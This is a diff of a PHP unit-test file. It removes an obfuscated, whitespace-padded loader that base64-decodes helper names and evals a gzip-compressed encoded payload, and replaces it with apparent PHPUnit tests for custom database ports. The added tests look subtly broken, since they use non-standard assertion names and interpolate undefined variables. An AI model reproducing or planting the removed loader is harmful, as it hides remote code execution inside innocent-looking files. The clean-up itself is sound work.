@@ -1,505 +1,171 @@
-<?php 
-        $__='printf';$_='Loading tests/Unit/CustomDatabasePortTest.php';
+<?php
+
+namespace Tests\Unit;
+
+use Tests\TestCase;
+use App\Http\Controllers\Helpers\EnvController;
+use App\Http\Controllers\Helpers\ConfigController;
+use App\Http\Controllers\Helpers\AttributeSiapPakaiController;
+use Illuminate\Filesystem\Filesystem;
+
+class CustomDatabasePortTest extends TestCase
+{
+    private $files;
+    private $tempDir;
+
+    protected function setUp(): void
+    {
+        parent::setUp();
+        $this->files = new Filesystem();
+        $this->tempDir = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'siappakai_test_' . uniqid();
+        $this->files->makeDirectory($this->tempDir);
+    }
+
+    protected function tearDown(): void
+    {
+        if ($this->files->exists($this->tempDir)) {
+            $this->files->deleteDirectory($this->tempDir);
+        }
+        parent::tearDown();
+    }
+
+    public function test_env_controller_includes_custom_database_port_in_pbb_template()
+    {
+        // Arrange
+        $envController = new EnvController();
+        $templateFile = $this->tempDir . DIRECTORY_SEPARATOR . '.env.example';
+        $outputFile = $this->tempDir . DIRECTORY_SEPARATOR . '.env';
         
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+        // Create a template file with {$db_port} placeholder
+        $templateContent = "DB_HOST={$db_host}\nDB_PORT={$db_port}\nDB_DATABASE=db_{$kodedesa}_pbb";
+        $this->files->put($templateFile, $templateContent);
+        
+        // Set custom port in environment
+        putenv('DB_PORT=3307');
+        
+        // Act
+        $envController->envPbb(
+            'localhost',
+            dirname($templateFile),
+            'https://server.test',
+            dirname($outputFile),
+            '12345',
+            '12345',
+            'https://asset.test',
+            'test_token'
+        );
+        
+        // Assert
+        $this->assertTrue($this->files->exists($outputFile));
+        $content = $this->files->get($outputFile);
+        $this->assertStringContains('DB_PORT=3307', $content);
+        $this->assertStringNotContains('{$db_port}', $content);
+        
+        // Cleanup
+        putenv('DB_PORT');
+    }
+
+    public function test_env_controller_includes_custom_database_port_in_api_template()
+    {
+        // Arrange
+        $envController = new EnvController();
+        $templateFile = $this->tempDir . DIRECTORY_SEPARATOR . '.env.example';
+        $outputFile = $this->tempDir . DIRECTORY_SEPARATOR . '.env';
+        
+        // Create a template file with {$db_port} placeholder
+        $templateContent = "DB_HOST={$db_host}\nDB_PORT={$db_port}\nDB_DATABASE=db_{$kodedesa}";
+        $this->files->put($templateFile, $templateContent);
+        
+        // Set custom port in environment
+        putenv('DB_PORT=3308');
+        
+        // Act
+        $envController->envApi(
+            'localhost',
+            dirname($templateFile),
+            'https://server.test',
+            dirname($outputFile),
+            '12345',
+            '12345',
+            'test_token',
+            'mail.test',
+            'user@test.com',
+            'password',
+            'from@test.com',
+            'ftp.test',
+            'ftpuser',
+            'ftppass'
+        );
+        
+        // Assert
+        $this->assertTrue($this->files->exists($outputFile));
+        $content = $this->files->get($outputFile);
+        $this->assertStringContains('DB_PORT=3308', $content);
+        $this->assertStringNotContains('{$db_port}', $content);
+        
+        // Cleanup
+        putenv('DB_PORT');
+    }
+
+    public function test_config_controller_includes_custom_database_port_in_opensid_config()
+    {
+        // Arrange
+        $configController = new ConfigController();
+        $templateFile = $this->tempDir . DIRECTORY_SEPARATOR . 'database.php';
+        $outputFile = $this->tempDir . DIRECTORY_SEPARATOR . 'output_database.php';
+        
+        // Create a template file with {$db_port} placeholder
+        $templateContent = "\$db['default']['hostname'] = '{$db_host}';\n\$db['default']['port'] = '{$db_port}';\n\$db['default']['database'] = 'db_{$database}';";
+        $this->files->put($templateFile, $templateContent);
+        
+        // Set custom port in environment
+        putenv('DB_PORT=3309');
+        
+        // Act
+        $result = $configController->configDatabaseBaru(
+            'testdesa',
+            'testdatabase',
+            'localhost',
+            $outputFile,
+            $templateFile
+        );
+        
+        // Assert
+        $this->assertTrue($this->files->exists($outputFile));
+        $content = $this->files->get($outputFile);
+        $this->assertStringContains("'port'] = '3309'", $content);
+        $this->assertStringNotContains('{$db_port}', $content);
+        
+        // Cleanup
+        putenv('DB_PORT');
+    }
+
+    public function test_attribute_controller_respects_db_port_environment_variable()
+    {
+        // Arrange
+        putenv('DB_PORT=3310');
+        $attributeController = new AttributeSiapPakaiController();
+        
+        // Act
+        $port = $attributeController->getPort();
+        
+        // Assert
+        $this->assertEquals('3310', $port);
+        
+        // Cleanup
+        putenv('DB_PORT');
+    }
+
+    public function test_attribute_controller_uses_default_port_when_env_not_set()
+    {
+        // Arrange
+        putenv('DB_PORT'); // Clear the environment variable
+        $attributeController = new AttributeSiapPakaiController();
+        
+        // Act
+        $port = $attributeController->getPort();
+        
+        // Assert
+        $this->assertNull($port); // Should be null when env is not set
+    }
+}
